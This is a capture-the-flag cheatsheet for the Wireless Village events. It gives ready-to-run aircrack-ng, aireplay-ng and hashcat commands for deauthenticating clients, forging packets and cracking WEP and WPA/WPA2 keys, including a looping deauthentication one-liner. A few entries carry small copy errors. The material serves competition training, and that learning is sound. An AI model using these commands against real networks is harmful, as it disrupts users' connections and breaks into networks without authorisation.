# Always Be Collecting
This cheatsheet is largely for the RF Hacker's Sanctuary [Wireless Village](https://rfhackers.com/wireless-village) Capture The Flag events.

Be familiar with the operating environment. New users should [install_pentoo](https://www.pentoo.ch/download/).

Read the `man` page(s)!

## Setup
Check the wireless interface(s) and start monitoring mode.
```
$ airmon-ng
$ airmon-ng start wlan0
```

Verify that [injection tests](https://www.aircrack-ng.org/doku.php?id=injection_test) work.
```
$ aireplay-ng -9 -e CTF_01 wlan0mon
```

## Reconnaissance
Find surrounding networks, access points and clients.
```code
$ airodump-ng wlan0mon
```

Begin collection on target channel, BSSID and recording to file.
```code
$ airodump-ng wlan0mon -c 36 --band a --bssid E0:05:C5:60:2E:65 --ivs -w capture
```
  - `-c` Select channel number
  - `-w` Write to file
  - `--bssid` MAC address of access point
  - `--ivs` Save only captured IVs (optional)
  - `--band` Select the wireless band. 'b' and 'g' uses 2.4GHz and 'a' uses 5GHz.

## Scenarios
There are different scenarios in which the target network may be configured. These may be access points with or without a client, a client looking for an access point, or compromising an access point via a client. The next section contains some of those known scenarios with procedures.

### WEP with connected client
This scenario is generally straight forward. Use a `while true` loop for deauthenticating client if necessary.

  1) Monitor and capture the target network traffic.
```code
$ airodump-ng wlan0mon -c 6 -e CTF_01 --ivs -w capture
```
  2) Run the fake authentication attack to associate with the target access point.
```code
$ aireplay-ng -1 100 -o 1 -q 10 -e CTF_01 wlan0mon
```
  3) Force the connected client to deauthenticate.
```code
$ aireplay-ng -0 3 -e CTF_01 -c client_mac wlan0mon
```
  4) Speed things up with an ARP request replay attack against the target access point.
```code
$ aireplay-ng -3 -e CTF_01 wlan0mon
```
  5) Run `aircrack-ng` to obtain the WEP key.

If the arp request replay attack isn't working then the `-p 0841` attack may be used in its place.
```code
$ aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -e CTF_01 wlan0mon
```

### WEP without connected client
The access point must be broadcasting data for this to work. This attack works better by adding the `-h` MAC address.
  1) Monitor and capture the target network traffic using `airodump-ng`.
  2) In a new console execute Fake Authentication attack method.
  3) In a new console execute Fragmentation or chopchop attack methods.
  4) Create an arp packet with `packetforge-ng`.
  5) Inject the arp packet using `aireplay-ng -2`.
  6) Run `aircrack-ng` to obtain the WEP key.

### WEP SKA with client
WEP access point configured to Shared-Key Authentication (SKA) with client. Use a `while true` loop for deauthenticating the client.

1) Monitor and capture the target network traffic.
```code
$ airodump-ng wlan0mon -c 6 -e CTF_01 -w capture
```
2) Force the connected client to deauthenticate to capture the PRGA XOR keystream.
```code
$ aireplay-ng -0 3 -e CTF_01 -c client_mac wlan0mon
```
3) Run the fake authentication attack with the XOR keystream to associate with the target access point.
```code
$ aireplay-ng -1 100 -o 1 -q 10 -e CTF_01 wlan0mon -y capture-01-9C-EF-D5-FB-51-60.xor
```
4) Speed things up with an ARP request replay attack against the target access point.
```code
$ aireplay-ng -3 -e CTF_01 wlan0mon
```
5) Run `aircrack-ng` to obtain the WEP key.

### WPA/WPA2 PSK with clients
Steps to perform an attack on a WPA/WPA2 access point with clients. The pre-shared (PSK) must be in the wordlists used. There is a bug in versions older than 1.5 where this will fail.

1) Monitor and capture the target network traffic.
```code
$ airodump-ng wlan0mon -c 6 -e CTF_01 -w capture
```
2) Force the connected client to deauthenticate to capture the PRGA XOR keystream.
```code
$ aireplay-ng -0 3 -e CTF_01 -c client_mac wlan0mon
```
3) Run `aircrack-ng` to obtain the PSK key.

### aircrack-ng
Begin cracking IVS file on target BSSID (can perform while airodump-ng is writing).
```code
$ aircrack-ng capture-01.ivs --bssid E0:05:C5:60:2E:65
```

Invoke PTW WEP cracking method method on an arp replay.
```code
$ aircrack-ng -z replay_arp-0309-015802.cap
```

### airmon-ng
Set interface to monitor mode.
```code
$ airmon-ng start wlx9cefd5fd1181
```

Stop monitor mode and restart networking.
```
$ airmon-ng stop wlan0mon
$ systemctl restart network-manager.service
```

Checking and kill networking services.
```
$ airmon-ng check kill
```

### aireplay-ng

#### Quick summary
Use `-D` for 5ghz bands. Attack modes (Numbers can still be used):

  - `--deauth`or `-0`
  - `--fakeauth` or `-1`
  - `--interactive`or `-2`
  - `--arpreplay` or `-3`
  - `--chopchop` or `-4`
  - `--fragment` or `-5`
  - `--test` or `-9`

#### Deauthentication
Set attack mode [Deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication).
  - `-0` Set for `deauthentication` mode
  - `-e` Target access point ESSID
  - `-a` Target access point MAC address
  - `-c` Set destination MAC address
```code
$ aireplay-ng -0 5 -e CTF_01 -a 9C:EF:D5:FB:51:60 -c client_mac wlan0mon
```

#### Fake Authentication
Set attack mode [Fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication).
  - `-1` Set for fake authentication attack
  - `180` Reassociation timing in seconds
  - `-o` Number of packets to send at a time
  - `-q` Frequency to send keep-alive packets
  - `-e` Target access point network name
  - `-a` Target access point MAC address
  - `-h` Our wireless card's MAC address
```code
$ aireplay-ng -1 180 -o 1 -q 10 -e CTF_01 -a 9C:EF:D5:FB:51:60 -h our_mac wlan0mon
```

#### Interactive packet replay
Set attack mode [Interactive packet replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay).
  - `-2` Set for interactive packet replay attack mode
  - `-r` ARP file to replay
```code
$ aireplay-ng -2 -r arp-request wlan0mon
```

#### ARP request replay attack
Set attack mode [ARP request replay attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection).
  - `-3` Set for ARP request replay attack mode
  - `-x` Number of packets-per-second
  - `-r` Extract packets from target pcap file
  - `-b` Target access point BSSID
  - `-h` Set source MAC address
```code
$ aireplay-ng -3 -x 100 -r replay.cap -b 9C:EF:D5:FB:51:60 -h our_mac wlan0mon
```

#### KoreK chopchop attack
Set attack mode [Korek chopchop](https://www.aircrack-ng.org/doku.php?id=korek_chopchop).
  - `-4` Set for chopchop attack
  - `-b` Target access point MAC address
  - `-h` Our wireless card's MAC address
```code
$  aireplay-ng -4 -b 9C:EF:D5:FB:51:60 -h our_mac wlan0mon
```

#### Fragmentation attack
Set attack mode [Fragmentation](https://www.aircrack-ng.org/doku.php?id=fragmentation).
  - `-5` Set for chopchop attack
  - `-b` Target access point MAC address
  - `-h` Our wireless card's MAC address
```code
$ aireplay-ng -5 -b 9C:EF:D5:FB:51:60 -h our_mac wlan0mon
```

#### packetforge-ng
Generate packets for injection from PRGA capture.

Summary of different modes:
  - `--arp` or `-0` for ARP packet
  - `--udp` or `-1` for UDP packet
  - `--icmp` or `-2` for ICMP packet
  - `--null` or `-3` for a null packet
  - `--custom` or `-9` for a custom packet

Additional example:
  - `-0` Set for generate arp packet
  - `-a` Target access point MAC address
  - `-h` Our wireless card's MAC address
  - `-k` Destination IP address (255.255.255.255)
  - `-l` Source IP address (255.255.255.255)
  - `-y` XOR file to read the PRGA from
  - `-w` Write to file
```code
$ packetforge-ng -0 -a 9C:EF:D5:FB:51:60 -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w arp-request
```

#### airolib-ng
[airolib-ng](https://www.aircrack-ng.org/doku.php?id=airolib-ng) is the database to store essid's, captured PMKs, import password lists and accelerate handshake cracking.
Create database and import essid file.
```code
$ airolib-ng CTF --import essid CTF_essids
```

Import password list(s).
```code
$ airolib-ng CTF --import passwd /usr/share/wordlists/cyberpunk.words
```

Begin batch processing of passwords to essid's.
```code
$ airolib-ng CTF --batch
```

### hcxdumptool
This technique requires a slightly different approach and is used against PSK networks. Set up the interface below.
```code
$ ip link set wlan0mon down
$ iwconfig wlan0mon mode monitor
$ ip link set wlan0mon up
```

Save the target BSSIDs to a file. Begin capturing with filtered parameters.
```code
$ hcxdumptool -i wlan0mon --enable_status -c 1 -o capture.pcapng --filterlist=filter_list --filtermode=2
```
_Section not finished._

#### hcxpcaptool
Use `hcxpcaptool` to extract the PMK hash IDs.
```code
$ hcxpcaptool -k pmkidhash capture.cap
```

Run `hashcat` to attempt to decrypt the PMK hash IDs.
```code
$ hashcat -m 16800 pmkidhash /usr/share/wordlists/cyberpunk.words --force
```

### wifite
[wifite](https://github.com/derv82/wifite2) is a tool that automates the process. No instructions, read the man page.

## Quick & Useful

### Loops
Loop deauthentication attack to target client.
```code
$ while true; do sleep 10 && aireplay-ng -0 1 -e CTF_01 -c sta_mac wlan0mon; done
```

### airodump-ng regex
Filter target ESSIDs.
```code
$ airodump-ng wlan0mon --essid-regex "^(CTF_01).*$"
$ airodump-ng wlan0mon --essid-regex ^.*(one|two|three).*$"
$ airodump-ng wlan0mon --essid-regex "CTF_([0-9]{1,2}|W.*)"
```

### Configure interface
Set link up or down.
```code
$ ip link set wlan0mon down
$ ip link set wlan0mon up
```

Set modes monitor or managed.
```code
$ iw wlan0mon set type managed
$ iw wlan0mon set type monitor
```

Set interface channel
```code
$ iw dev wlan0mon set channel 6
```

### Wireshark & tshark
Using Wireshark to filter target packets.
```code
wlan.addr == target_mac && wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol
```

Using tshark to extract the handshakes.
```code
$ tshark -r filter.pcap -R "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol) && wlan.addr == 9C:EF:D5:FB:51:60" -2
```

## Sources
 * [Aircrack-ng Tutorials](https://www.aircrack-ng.org/doku.php?id=tutorial)
 * [Aircrack-ng Newbie Guide for Linux](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
 * [Tutorial: How to crack WEP with no wireless clients](https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients)
 * [Understanding systemd’s predictable network device names](https://major.io/2015/08/21/understanding-systemds-predictable-network-device-names/)
 * [How to extract all handshakes from a capture file with several handshakes](https://miloserdov.org/?p=1047)
